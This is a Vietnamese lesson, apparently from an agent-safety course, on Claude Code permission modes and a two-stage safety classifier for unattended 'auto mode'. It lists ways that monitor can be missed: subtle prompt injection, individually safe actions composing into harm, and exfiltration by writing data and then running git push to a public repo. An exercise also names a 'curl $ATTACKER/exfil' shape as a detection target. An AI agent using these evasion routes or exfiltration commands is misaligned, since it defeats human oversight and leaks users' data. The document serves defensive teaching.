# Mã Claude dưới dạng Agent tự trị: Chế độ quyền và Chế độ tự động

> Claude Code hiển thị bảy chế độ quyền. "plan" hỏi trước mọi hành động, "default" chỉ yêu cầu những hành động rủi ro, "acceptEdits" tự động phê duyệt ghi tệp nhưng vẫn xác nhận thực thi shell và "bypassPermissions" phê duyệt mọi thứ. Chế độ tự động (ngày 24 tháng 3 năm 2026) thay thế phê duyệt cho mỗi hành động bằng bộ phân loại an toàn song song hai giai đoạn: kiểm tra nhanh một token chạy trên mọi hành động; Các hành động được gắn cờ bắt đầu một bài đánh giá chain-of-thought sâu. Ngân sách hành động được thực thi thông qua `max_turns` và `max_budget_usd`. Chế độ tự động shipped như một bản xem trước nghiên cứu - Anthropic đã tuyên bố rõ ràng rằng chỉ riêng bộ phân loại là không đủ.

**Loại:** Học
**Ngôn ngữ:** Python (stdlib, two-stage classifier simulator)
**Kiến thức tiên quyết:** Giai đoạn 15 · 01 (Đường chân trời dài agents), Giai đoạn 15 · 09 (Mã hóa-agent ngang)
**Thời lượng:** ~45 phút

## Vấn đề

Một agent mã hóa tự động trên máy của bạn là một danh mục bảo mật riêng biệt. Bề mặt tấn công là mọi thứ mà agent có thể tiếp cận - hệ thống tệp, mạng, thông tin đăng nhập, khay nhớ tạm, bất kỳ tab trình duyệt nào, bất kỳ thiết bị đầu cuối nào đang mở. Bruce Schneier và những người khác đã gắn cờ điều này một cách công khai: agents sử dụng máy tính không phải là một "bản cập nhật feature" của chatbot, chúng là một loại công cụ mới với một loại hồ sơ rủi ro mới.

Hệ thống quyền của Claude Code là câu trả lời của Anthropic. Thay vì một công tắc "tự động / không tự chủ", có bảy chế độ trải dài trên một bậc thang khả năng: lập kế hoạch → mặc định → chấp nhậnSửa đổi → ... → bỏ quaPermissions. Mỗi chế độ là một sự đánh đổi khác nhau giữa tốc độ và đánh giá cho mỗi hành động. Chế độ tự động (Tháng 3 năm 2026) bổ sung một bộ phân loại hai giai đoạn di chuyển phê duyệt ra khỏi đường dẫn quan trọng của người dùng đối với các hành động mà bộ phân loại đánh giá là an toàn, đồng thời giữ nguyên lớp xem xét cho các hành động mà bộ phân loại gắn cờ.

Câu hỏi kỹ thuật: hệ thống này bắt được gì, nó bỏ lỡ điều gì và một tác vụ nhất định thực sự đảm bảo chế độ nào?

## Khái niệm

### Bảy chế độ cấp phép

| Chế độ | Hành vi | Trường hợp sử dụng |
|---|---|---|
| `plan` | Agent đề xuất một kế hoạch; người dùng phê duyệt toàn bộ kế hoạch; Mọi hành động đều được xem xét trước khi thực hiện | Nhiệm vụ không quen thuộc; mã liền kề sản phẩm; Lần đầu tiên sử dụng agent trên repo |
| `default` | Agent chạy các hành động; prompts người dùng cho bất kỳ hành động "rủi ro" nào (shell exec, hoạt động phá hoại, cuộc gọi mạng) | Mã hóa tương tác nhất sessions |
| `acceptEdits` | Ghi tệp tự động phê duyệt; Shell Exec và các cuộc gọi mạng vẫn prompt | Chuyển tái cấu trúc qua nhiều tệp |
| `acceptExec` | Các lệnh shell tự động phê duyệt trong danh sách cho phép được tuyển chọn; Viết tự động phê duyệt | Các vòng lặp bên trong chặt chẽ nơi mọi lệnh shell đều `npm test` hoặc tương tự |
| `autoMode` | Bộ phân loại an toàn hai giai đoạn; Hành động được gắn cờ nâng lên xem xét | Chạy dài không cần giám sát trong một không gian làm việc hạn chế |
| `yolo` | Bỏ qua hầu hết các prompts; Vẫn chạy danh sách cho phép / danh sách từ chối của công cụ | sandboxes phù du, việc làm CI, nghiên cứu scripts |
| `bypassPermissions` | Phê duyệt mọi thứ | Được ghi nhận là "chỉ bên trong containers phù du mà bạn sẵn sàng vứt bỏ" |

(Tên trên khớp với tài liệu Bộ luật Claude công khai; "Yolo" là cách viết tắt không chính thức cho nền tảng trung gian dễ dãi.)

### Chế độ tự động trong một trang

Chế độ tự động (ra mắt vào ngày 24 tháng 3 năm 2026) là chế độ cấp phép đầu tiên ủy quyền phê duyệt cho mỗi hành động cho một model. Kết cấu:

1. **Giai đoạn 1 - bộ phân loại một token.** Chạy trên mọi hành động được đề xuất. Trả về "an toàn" hoặc "cờ". Được thiết kế để chạy song song với vòng lặp agent chính để các hành động được phê duyệt không nằm trong hàng đợi.
2. **Giai đoạn 2 — xem xét policy/safety phụ.** Chỉ chạy trên các hành động được gắn cờ. Thực hiện đánh giá policy và an toàn tập trung đối với hành động, trạng thái hiện tại của session và nhiệm vụ đã khai báo. Chuyển sang HITL của người dùng nếu độ tin cậy thấp.

Kiểm soát ngân sách nằm bên cạnh bộ phân loại:

- `max_turns` — tổng số lần lặp lại trong một session.
- `max_budget_usd` - giới hạn đô la hủy bỏ session.
- giới hạn số lượng hành động trên mỗi công cụ (không quá N `WebFetch` cuộc gọi, v.v.).

### Những gì hệ thống nắm bắt

- Chèn prompt đơn giản vào đầu vào công cụ trong đó lệnh được đưa vào ánh xạ đến một hình dạng hành động rủi ro đã biết.
- Vòng lặp công cụ lặp đi lặp lại — bộ phân loại có thể thấy hành động N+1 gần giống với hành động N, năm lần liên tiếp.
- Rõ ràng là các lệnh shell nằm ngoài phạm vi trên một session chỉ chỉnh sửa tệp.

### Những gì hệ thống có thể bỏ lỡ

- **Chèn prompt tinh tế** điều chỉnh hành vi mà không tạo ra một hành động bị gắn cờ nào. Chèn prompt gián tiếp không phải là một lỗ hổng có thể vá hoàn toàn (OpenAI preparedness head, 2025, trên trình duyệt agents — xem Bài 11).
- **Hành vi sai trái ở cấp độ ngữ nghĩa.** Mọi hành động riêng lẻ đều có thể trông an toàn trong khi quỹ đạo được soạn thảo là có hại. Người phân loại đánh giá hành động; nó không lấy lại ý định của người dùng.
- **Trích xuất thông qua các kênh hợp pháp.** Ghi dữ liệu vào tệp bạn sở hữu, sau đó `git push` vào repo công khai, là một chuỗi các hành động được phép mà thành phần là vấn đề.

### Khung xem trước nghiên cứu

Anthropic shipped Chế độ tự động như một bản xem trước nghiên cứu. Tài liệu nêu rõ rằng bộ phân loại là một lớp, không phải là một giải pháp: người dùng phải kết hợp Chế độ tự động với ngân sách, danh sách cho phép, không gian làm việc biệt lập và kiểm tra quỹ đạo (Bài 12–16). Khung xem trước cũng phản ánh khoảng cách đánh giá và triển khai được ghi lại (Bài 1) — một bộ phân loại vượt qua các đánh giá ngoại tuyến có thể hoạt động khác nhau trong một session thực tế mà ngữ cảnh của người dùng không rõ ràng.

### Thang này nằm ở đâu trong quy trình làm việc của bạn

- Nhiệm vụ không quen thuộc: bắt đầu từ `plan`. Đọc kế hoạch rẻ hơn là quay trở lại một cuộc chạy tồi.
- Tái cấu trúc đã biết: `acceptEdits` tiết kiệm rất nhiều nhấp chuột xác nhận.
- Chạy nền không giám sát: chỉ `autoMode` bên trong không gian làm việc có bán kính vụ nổ mà bạn đã đo (không có thông tin xác thực, không gắn production, không có lối ra mà bạn không chọn tham gia).
- containers tạm thời: `yolo` / `bypassPermissions` được chấp nhận nếu và chỉ khi container và thông tin đăng nhập của nó dùng một lần.

```figure
autonomy-oversight
```

## Ứng dụng

`code/main.py` mô phỏng bộ phân loại hai giai đoạn. Giai đoạn 1 là quy tắc từ khóa rẻ tiền đối với các hành động được đề xuất; Giai đoạn 2 là một trình đánh giá nhiều quy tắc chậm hơn. Trình điều khiển cung cấp trong một quỹ đạo tổng hợp ngắn (hành động an toàn, nỗ lực tiêm prompt, vòng lặp lặp lại) và hiển thị nơi bộ phân loại bắt và nơi nó bỏ lỡ.

## Sản phẩm bàn giao

`outputs/skill-permission-mode-picker.md` khớp mô tả nhiệm vụ với chế độ cấp phép phù hợp, giới hạn ngân sách và cách ly bắt buộc.

## Bài tập

1. Chạy `code/main.py`. Loại hành động tổng hợp nào không bao giờ bị gắn cờ bởi Giai đoạn 1 nhưng luôn bị bắt bởi Giai đoạn 2? Cái nào không bị bắt bởi cả hai?

2. Mở rộng bộ quy tắc Giai đoạn 1 để bắt một hình dạng đã biết-xấu cụ thể (ví dụ: `curl $ATTACKER/exfil`). Đo tỷ lệ dương tính giả trên mẫu tác dụng lành tính.

3. Đọc tài liệu "Cách hoạt động của vòng lặp agent" của Anthropic. Liệt kê mọi trạng thái bên ngoài mà agent chạm vào theo mặc định ở chế độ `default`. Bạn cần cổng nào riêng biệt trước khi chạy `autoMode` mà không cần giám sát?

4. Thiết kế ngân sách chạy không giám sát 24 giờ: `max_turns`, `max_budget_usd`, giới hạn cho mỗi công cụ, danh sách cho phép. Biện minh cho từng con số.

5. Mô tả một quỹ đạo trong đó mọi hành động riêng lẻ đều được Giai đoạn 1 và Giai đoạn 2 chấp thuận, nhưng hành vi được soạn thảo lại bị lệch. (Bài 14 đề cập đến cách ngắt kết nối và canary tokens giải quyết vấn đề này.)

## Thuật ngữ chính

| Thuật ngữ | Những gì mọi người nói | Ý nghĩa thực sự của nó |
|---|---|---|
| Chế độ quyền | "agent có thể làm được bao nhiêu" | Một trong bảy người được nêu tên policies kiểm soát phê duyệt cho mỗi hành động |
| Chế độ kế hoạch | "Hãy hỏi trước bất cứ điều gì" | Agent viết một kế hoạch; Người dùng phê duyệt trước khi thực thi |
| chấp nhậnSửa đổi | "Hãy để nó viết tệp" | Ghi tệp tự động phê duyệt; Giám đốc điều hành Shell vẫn prompts |
| Chế độ tự động | "Tự động phê duyệt" | Bộ phân loại an toàn hai giai đoạn; Hành động bị gắn cờ leo thang |
| bypassQuyền | "YOLO đầy đủ" | Phê duyệt mọi thứ; dành cho containers tạm thời |
| Bộ phân loại giai đoạn 1 | "Kiểm tra token nhanh" | Quy tắc một token đối với hành động được đề xuất; chạy song song |
| Bộ phân loại giai đoạn 2 | "Đánh giá sâu" | Chain-of-thought lý do về các hành động bị gắn cờ |
| Xem trước nghiên cứu | "Không phải GA" | Anthropic khung cho features có chế độ lỗi vẫn đang được ánh xạ |

## Đọc thêm

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — chế độ quyền, ngân sách, định dạng hành động.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — model thực thi dịch vụ được quản lý.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) - feature bề mặt và thông báo Chế độ tự động.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — lớp dựa trên lý do định hình các phán đoán của bộ phân loại.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — quan điểm nội bộ về thiết kế quyền đường chân trời dài.
